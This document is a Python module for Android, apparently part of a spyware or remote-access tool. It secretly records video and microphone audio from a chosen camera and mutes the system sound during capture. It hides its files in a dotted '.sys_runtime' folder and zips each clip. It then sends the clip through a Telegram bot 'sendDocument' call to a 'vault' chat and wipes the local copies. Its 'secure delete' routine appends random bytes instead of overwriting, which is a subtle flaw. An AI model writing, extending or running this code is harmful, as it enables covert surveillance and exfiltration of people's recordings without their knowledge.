# -*- coding: utf-8 -*-
import os
import time
import threading
import zipfile
import logging
import gc
from datetime import datetime

# إعداد المسارات والمجلدات
P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "v_tmp")
for d in [P, T]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "v.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False


class StreamManager:
    def __init__(self):
        self.recording = False
        self._old_volume = -1   # لحفظ مستوى صوت النظام القديم
        self._res_map = {
            "144": [256, 144, 150000],
            "360": [640, 360, 800000],
            "720": [1280, 720, 2500000],
            "1080": [1920, 1080, 5000000]
        }

    def _mute_audio(self, mute=True):
        """كتم صوت النظام عبر AudioManager (يعمل على Android 10+)"""
        if not JNI:
            return
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            AudioManager = autoclass('android.media.AudioManager')
            am = activity.getSystemService(activity.AUDIO_SERVICE)

            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    def _is_video_valid(self, path, min_duration_ms=500, min_size_bytes=10240):
        """التحقق من صحة ملف الفيديو باستخدام MediaMetadataRetriever (JNI)"""
        if not os.path.exists(path):
            return False
        size = os.path.getsize(path)
        if size < min_size_bytes:
            logging.warning(f"Video too small: {size} bytes")
            return False
        if not JNI:
            return True  # إذا لم يكن JNI متاحاً، نعتمد على الحجم فقط
        try:
            Retriever = autoclass('android.media.MediaMetadataRetriever')
            retriever = Retriever()
            retriever.setDataSource(path)
            duration_str = retriever.extractMetadata(Retriever.METADATA_KEY_DURATION)
            retriever.release()
            if duration_str:
                duration = int(duration_str)
                if duration >= min_duration_ms:
                    return True
                else:
                    logging.warning(f"Video too short: {duration} ms")
            else:
                logging.warning("Could not extract video duration")
        except Exception as e:
            logging.error(f"Video validation error: {e}")
        return False

    def _secure_delete(self, path):
        """حذف آمن بالكتابة على دفعات (4KB) لتوفير الذاكرة"""
        try:
            if os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 0:
                    chunk = 4096
                    with open(path, "ba+", buffering=0) as f:
                        for _ in range(0, sz, chunk):
                            f.write(os.urandom(min(chunk, sz)))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(path)
        except Exception as e:
            logging.error(f"Secure delete error: {e}")

    def _open_camera_with_retry(self, camera_manager, camera_id, max_retries=3):
        """فتح الكاميرا مع إعادة المحاولة (حل مشكلة الانشغال المؤقت)"""
        for attempt in range(max_retries):
            try:
                # في jnius، قد تحتاج إلى استخدام StateCallback، لكن للتبسيط نستخدم openCamera المتزامن
                camera = camera_manager.openCamera(camera_id, None, None)
                if camera:
                    return camera
            except Exception as e:
                logging.warning(f"Open camera attempt {attempt+1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(0.5)
        return None

    def record(self, mon, cam=0, dur=15):
        """بدء التسجيل (يُستدعى من الخارج)"""
        if self.recording:
            return
        threading.Thread(target=self._worker, args=(mon, cam, dur), daemon=True).start()

    def _worker(self, mon, cam_idx, dur):
        """معالج التسجيل في خيط منفصل باستخدام Camera2 API"""
        self.recording = True
        raw_path = os.path.join(T, f"v_{int(time.time())}.mp4")
        zipped_path = raw_path.replace(".mp4", ".zip")

        resolution_key = getattr(mon, 'video_res', "360")
        w, h, bitrate = self._res_map.get(resolution_key, self._res_map["360"])

        success = False
        if JNI:
            self._mute_audio(True)
            media_recorder = None
            camera_device = None
            capture_session = None
            handler_thread = None
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                Context = autoclass('android.content.Context')
                CameraManager = activity.getSystemService(Context.CAMERA_SERVICE)

                # الحصول على معرف الكاميرا المطلوبة
                camera_ids = CameraManager.getCameraIdList()
                if cam_idx >= len(camera_ids):
                    cam_idx = 0
                target_id = camera_ids[cam_idx]

                # فتح الكاميرا مع إعادة المحاولة
                camera_device = self._open_camera_with_retry(CameraManager, target_id)
                if not camera_device:
                    logging.error("Failed to open camera after retries")
                    return

                # إعداد MediaRecorder
                MediaRecorder = autoclass('android.media.MediaRecorder')
                media_recorder = MediaRecorder()

                # ضبط مصادر الصوت والفيديو
                media_recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                media_recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                media_recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                media_recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                media_recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                media_recorder.setVideoSize(w, h)
                media_recorder.setVideoEncodingBitRate(bitrate)
                # ضبط اتجاه الفيديو (صحيح للكاميرا الأمامية والخلفية)
                orientation = 270 if cam_idx == 1 else 90
                media_recorder.setOrientationHint(orientation)
                media_recorder.setOutputFile(raw_path)

                media_recorder.prepare()

                # الحصول على Surface من MediaRecorder لاستخدامه في جلسة الالتقاط
                recorder_surface = media_recorder.getSurface()

                # إنشاء جلسة التقاط (CaptureSession) باستخدام Camera2
                HandlerThread = autoclass('android.os.HandlerThread')
                Handler = autoclass('android.os.Handler')
                handler_thread = HandlerThread("recorder_handler")
                handler_thread.start()
                handler = Handler(handler_thread.getLooper())

                # إنشاء جلسة الالتقاط
                # في jnius، تحتاج إلى تنفيذ واجهة CameraCaptureSession.StateCallback
                # سنقوم بتبسيطها هنا باستخدام كائن وهمي (لتجنب التعقيد، يمكن استخدام أسلوب معروف)
                # لكن للعمل الفعلي، يجب إنشاء StateCallback حقيقي.
                # بدلاً من ذلك، نستخدم طريقة مباشرة عبر `createCaptureSession` مع callback مبسط.

                class SessionCallback(PythonJavaClass):
                    __javainterfaces__ = ['android/hardware/camera2/CameraCaptureSession$StateCallback']
                    def __init__(self, ready_event):
                        super().__init__()
                        self.ready_event = ready_event
                    @java_method('(Landroid/hardware/camera2/CameraCaptureSession;)V')
                    def onConfigured(self, session):
                        self.ready_event.set()
                    @java_method('(Landroid/hardware/camera2/CameraCaptureSession;)V')
                    def onConfigureFailed(self, session):
                        self.ready_event.set()  # فشل ولكن نحرر الحدث

                ready_event = threading.Event()
                session_callback = SessionCallback(ready_event)

                # إنشاء الجلسة
                camera_device.createCaptureSession([recorder_surface], session_callback, handler)
                if not ready_event.wait(3):  # انتظار حتى 3 ثوانٍ
                    logging.error("CaptureSession creation timeout")
                    return

                # بدء التسجيل
                media_recorder.start()

                # التسجيل للمدة المطلوبة
                time.sleep(dur)

                # إيقاف التسجيل
                media_recorder.stop()
                success = True

            except Exception as e:
                logging.error(f"Recording error: {e}")
            finally:
                self._mute_audio(False)
                # تنظيف الموارد
                try:
                    if media_recorder:
                        media_recorder.reset()
                        media_recorder.release()
                    if capture_session:
                        capture_session.close()
                    if camera_device:
                        camera_device.close()
                    if handler_thread:
                        handler_thread.quitSafely()
                except Exception as cleanup_err:
                    logging.error(f"Cleanup error: {cleanup_err}")

        # التحقق من صحة الفيديو
        if success and self._is_video_valid(raw_path):
            try:
                # ضغط الفيديو إلى ZIP
                with zipfile.ZipFile(zipped_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.write(raw_path, os.path.basename(raw_path))

                # إرسال إلى قناة الخزنة (Vault)
                vault = getattr(mon, 'vlt', None)
                tg = getattr(mon, 'tg', None)
                if vault and tg:
                    with open(zipped_path, 'rb') as f:
                        tg._ap("sendDocument",
                              {"chat_id": vault,
                               "caption": f"🎥 {resolution_key}p | CAM_{cam_idx} | {datetime.now().strftime('%H:%M')}"},
                              {"document": f})
                # حذف آمن للملفات الأصلية والـ ZIP
                self._secure_delete(raw_path)
                self._secure_delete(zipped_path)
            except Exception as e:
                logging.error(f"Finalization error: {e}")
        else:
            # حذف الملف التالف فوراً (بدون إرسال)
            if os.path.exists(raw_path):
                try:
                    os.remove(raw_path)
                except:
                    pass

        self.recording = False
        gc.collect()


def create():
    return StreamManager()
